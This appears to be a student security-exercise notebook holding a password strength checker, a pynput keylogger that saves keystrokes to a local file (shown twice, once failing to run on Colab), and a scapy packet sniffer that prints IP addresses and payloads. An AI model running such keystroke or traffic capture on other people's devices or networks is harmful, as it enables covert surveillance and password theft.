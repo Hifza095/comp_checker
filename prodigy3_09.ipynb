{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WDC_17Q-BCv7",
        "outputId": "6466a3e7-4800-48e2-e3c3-5a3b636ca98b"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Enter your password: Hiphogulab78##\n",
            "Your password is very strong.\n"
          ]
        }
      ],
      "source": [
        "import re\n",
        "\n",
        "def assess_password_strength(password):\n",
        "    # Criteria flags\n",
        "    length_criteria = len(password) >= 8\n",
        "    uppercase_criteria = bool(re.search(r'[A-Z]', password))\n",
        "    lowercase_criteria = bool(re.search(r'[a-z]', password))\n",
        "    number_criteria = bool(re.search(r'[0-9]', password))\n",
        "    special_char_criteria = bool(re.search(r'[\\W_]', password))  # Matches any non-alphanumeric character\n",
        "\n",
        "    # Evaluate password strength\n",
        "    strength_score = sum([\n",
        "        length_criteria,\n",
        "        uppercase_criteria,\n",
        "        lowercase_criteria,\n",
        "        number_criteria,\n",
        "        special_char_criteria\n",
        "    ])\n",
        "\n",
        "    # Provide feedback based on the score\n",
        "    if strength_score == 5:\n",
        "        feedback = \"Your password is very strong.\"\n",
        "    elif strength_score == 4:\n",
        "        feedback = \"Your password is strong, but could be improved.\"\n",
        "    elif strength_score == 3:\n",
        "        feedback = \"Your password is moderate, consider adding more complexity.\"\n",
        "    elif strength_score == 2:\n",
        "        feedback = \"Your password is weak, consider adding more characters and different types.\"\n",
        "    else:\n",
        "        feedback = \"Your password is very weak, please choose a stronger password.\"\n",
        "\n",
        "    # Detail which criteria were not met\n",
        "    if not length_criteria:\n",
        "        feedback += \"\\n- Consider making your password at least 8 characters long.\"\n",
        "    if not uppercase_criteria:\n",
        "        feedback += \"\\n- Include at least one uppercase letter.\"\n",
        "    if not lowercase_criteria:\n",
        "        feedback += \"\\n- Include at least one lowercase letter.\"\n",
        "    if not number_criteria:\n",
        "        feedback += \"\\n- Include at least one number.\"\n",
        "    if not special_char_criteria:\n",
        "        feedback += \"\\n- Include at least one special character (e.g., !@#$%^&*()).\"\n",
        "\n",
        "    return feedback\n",
        "\n",
        "# Example usage\n",
        "password = input(\"Enter your password: \")\n",
        "print(assess_password_strength(password))\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "pip install pynput\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vCt-lY3ZDKjV",
        "outputId": "571388d5-b59e-49d7-9dc8-2e29a954d24f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pynput\n",
            "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from pynput) (1.16.0)\n",
            "Collecting evdev>=1.3 (from pynput)\n",
            "  Downloading evdev-1.7.1.tar.gz (30 kB)\n",
            "  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Collecting python-xlib>=0.17 (from pynput)\n",
            "  Downloading python_xlib-0.33-py2.py3-none-any.whl.metadata (6.2 kB)\n",
            "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m90.2/90.2 kB\u001b[0m \u001b[31m3.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading python_xlib-0.33-py2.py3-none-any.whl (182 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m182.2/182.2 kB\u001b[0m \u001b[31m8.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hBuilding wheels for collected packages: evdev\n",
            "  Building wheel for evdev (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for evdev: filename=evdev-1.7.1-cp310-cp310-linux_x86_64.whl size=92956 sha256=befe51f4c714bcfdac231fce7b34953d683c15ef7cf1c5cb7d5f06ab420ee6f0\n",
            "  Stored in directory: /root/.cache/pip/wheels/97/dc/9f/d5066d7977e11ec038fb217f420e1b4e4fb401133594bb0b33\n",
            "Successfully built evdev\n",
            "Installing collected packages: python-xlib, evdev, pynput\n",
            "Successfully installed evdev-1.7.1 pynput-1.7.7 python-xlib-0.33\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ImportError: this platform is not supported: ('failed to acquire X connection: Bad display name \"\"', DisplayNameError(''))\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 106
        },
        "id": "JevQqxhjGEsQ",
        "outputId": "ff304952-34e5-4d41-cd80-76dea2d30bdc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-10-149526946695>, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-10-149526946695>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    ImportError: this platform is not supported: ('failed to acquire X connection: Bad display name \"\"', DisplayNameError(''))\u001b[0m\n\u001b[0m                      ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "rMEtn86rH7zf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from pynput.keyboard import Key, Listener\n",
        "\n",
        "# Specify the file to store the logged keystrokes\n",
        "log_file = \"key_log.txt\"\n",
        "\n",
        "def on_press(key):\n",
        "    try:\n",
        "        # Log regular keys pressed and save them to a file\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key.char}\")\n",
        "    except AttributeError:\n",
        "        # Handle special keys (e.g., shift, enter)\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\" [{str(key)}] \")\n",
        "\n",
        "def on_release(key):\n",
        "    # Stop listener if the 'esc' key is pressed\n",
        "    if key == Key.esc:\n",
        "        return False\n",
        "\n",
        "# Set up the listener to monitor keyboard input\n",
        "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
        "    listener.join()\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 598
        },
        "id": "WCGDGMfVEhsH",
        "outputId": "04e9b89c-f65a-4155-8c8c-76806168d999"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ImportError",
          "evalue": "this platform is not supported: ('failed to acquire X connection: Bad display name \"\"', DisplayNameError(''))\n\nTry one of the following resolutions:\n\n * Please make sure that you have an X server running, and that the DISPLAY environment variable is set correctly",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mImportError\u001b[0m                               Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-9-1d6dd66fb6e7>\u001b[0m in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpynput\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mkeyboard\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mKey\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mListener\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;31m# Specify the file to store the logged keystrokes\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0mlog_file\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m\"key_log.txt\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pynput/__init__.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     38\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     39\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 40\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mkeyboard\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     41\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mmouse\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pynput/keyboard/__init__.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     29\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     30\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 31\u001b[0;31m \u001b[0mbackend\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mbackend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0m__name__\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     32\u001b[0m \u001b[0mKeyCode\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mbackend\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mKeyCode\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     33\u001b[0m \u001b[0mKey\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mbackend\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mKey\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pynput/_util/__init__.py\u001b[0m in \u001b[0;36mbackend\u001b[0;34m(package)\u001b[0m\n\u001b[1;32m     75\u001b[0m                 \u001b[0mresolutions\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mappend\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mRESOLUTIONS\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mmodule\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     76\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 77\u001b[0;31m     raise ImportError('this platform is not supported: {}'.format(\n\u001b[0m\u001b[1;32m     78\u001b[0m         \u001b[0;34m'; '\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0me\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0me\u001b[0m \u001b[0;32min\u001b[0m \u001b[0merrors\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0;34m'\\n\\n'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     79\u001b[0m             \u001b[0;34m'Try one of the following resolutions:\\n\\n'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mImportError\u001b[0m: this platform is not supported: ('failed to acquire X connection: Bad display name \"\"', DisplayNameError(''))\n\nTry one of the following resolutions:\n\n * Please make sure that you have an X server running, and that the DISPLAY environment variable is set correctly",
            "",
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"
          ],
          "errorDetails": {
            "actions": [
              {
                "action": "open_url",
                "actionText": "Open Examples",
                "url": "/notebooks/snippets/importing_libraries.ipynb"
              }
            ]
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pip install scapy\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "VJB98WrcH95K",
        "outputId": "a252ec35-af5a-4d6f-a792-9238e44be392"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting scapy\n",
            "  Downloading scapy-2.5.0.tar.gz (1.3 MB)\n",
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/1.3 MB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m\u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.2/1.3 MB\u001b[0m \u001b[31m6.5 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[91m╸\u001b[0m \u001b[32m1.3/1.3 MB\u001b[0m \u001b[31m20.1 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.3/1.3 MB\u001b[0m \u001b[31m14.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: scapy\n",
            "  Building wheel for scapy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for scapy: filename=scapy-2.5.0-py2.py3-none-any.whl size=1444319 sha256=d21745a70076597ed4adcf31ea77e6dcee67aff4233ba7855bfe6b78fb87681a\n",
            "  Stored in directory: /root/.cache/pip/wheels/82/b7/03/8344d8cf6695624746311bc0d389e9d05535ca83c35f90241d\n",
            "Successfully built scapy\n",
            "Installing collected packages: scapy\n",
            "Successfully installed scapy-2.5.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from scapy.all import sniff\n",
        "from scapy.layers.inet import IP, TCP, UDP\n",
        "\n",
        "# Define a function to process each captured packet\n",
        "def process_packet(packet):\n",
        "    # Check if the packet has an IP layer\n",
        "    if packet.haslayer(IP):\n",
        "        # Extract source and destination IP addresses\n",
        "        src_ip = packet[IP].src\n",
        "        dst_ip = packet[IP].dst\n",
        "        protocol = packet[IP].proto\n",
        "\n",
        "        # Initialize protocol name\n",
        "        protocol_name = \"Unknown\"\n",
        "\n",
        "        # Identify the protocol\n",
        "        if packet.haslayer(TCP):\n",
        "            protocol_name = \"TCP\"\n",
        "        elif packet.haslayer(UDP):\n",
        "            protocol_name = \"UDP\"\n",
        "\n",
        "        # Display relevant packet information\n",
        "        print(f\"Source IP: {src_ip} -> Destination IP: {dst_ip} | Protocol: {protocol_name}\")\n",
        "\n",
        "        # Display payload data if available\n",
        "        if packet.haslayer(TCP) or packet.haslayer(UDP):\n",
        "            payload = bytes(packet[TCP].payload) if packet.haslayer(TCP) else bytes(packet[UDP].payload)\n",
        "            print(f\"Payload: {payload}\\n\")\n",
        "\n",
        "# Start sniffing network packets\n",
        "print(\"Starting packet sniffer...\")\n",
        "sniff(filter=\"ip\", prn=process_packet, store=0)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "o0r66dhEIo0h",
        "outputId": "8027ecba-aef4-4c3f-f21f-43a5d063a836"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "pip install pynput\n",
        "\n"
      ],
      "metadata": {
        "id": "PtzD4hffPpgc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from pynput.keyboard import Key, Listener\n",
        "\n",
        "# Specify the file to store the logged keystrokes\n",
        "log_file = \"key_log.txt\"\n",
        "\n",
        "def on_press(key):\n",
        "    try:\n",
        "        # Log regular keys pressed and save them to a file\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key.char}\")\n",
        "    except AttributeError:\n",
        "        # Handle special keys (e.g., shift, enter)\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\" [{str(key)}] \")\n",
        "\n",
        "def on_release(key):\n",
        "    # Stop listener if the 'esc' key is pressed\n",
        "    if key == Key.esc:\n",
        "        return False\n",
        "\n",
        "# Set up the listener to monitor keyboard input\n",
        "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
        "    listener.join()\n"
      ],
      "metadata": {
        "id": "P3ZyzWGeP9Gf"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}